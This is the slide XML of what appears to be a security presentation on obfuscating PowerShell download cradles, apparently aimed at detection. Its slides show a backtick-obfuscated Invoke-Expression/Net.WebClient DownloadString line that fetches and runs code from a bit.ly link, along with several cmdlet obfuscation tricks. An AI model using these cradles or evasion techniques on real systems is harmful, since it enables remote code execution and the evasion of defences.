              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"`N`e`T`.`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>W`e`B`C`l`i`e`N`T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)."`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>D`o`w`N`l`o`A`d`S`T`R`i`N`g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>"( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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5930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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> "`N`e`T`.`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>W`e`B`C`l`i`e`N`T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>")."`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>D`o`w`N`l`o`A`d`S`T`R`i`N`g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>"( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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40488" y="3437128"/>
            <a:ext cx="7547905" cy="193899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 marL="0" lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Many options for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> obfuscation: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>N`e`w`-`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>O`B`j`e`c`T</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>w-Ob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;('{1}{0}' -f </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>','New-O')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill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8498" y="3955681"/>
            <a:ext cx="7147789" cy="1586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18177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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> "`N`e`T`.`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>W`e`B`C`l`i`e`N`T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>")."`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>D`o`w`N`l`o`A`d`S`T`R`i`N`g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>"( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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40488" y="3437122"/>
            <a:ext cx="7547905" cy="193899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 marL="0" lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Many options for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> obfuscation: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>N`e`w`-`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>O`B`j`e`c`T</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>w-Ob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;('{1}{0}' -f </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>','New-O')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Command New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ExecutionContext.InvokeCommand.GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>('New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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92425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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> "`N`e`T`.`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>W`e`B`C`l`i`e`N`T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>")."`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>D`o`w`N`l`o`A`d`S`T`R`i`N`g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>"( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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40488" y="3437122"/>
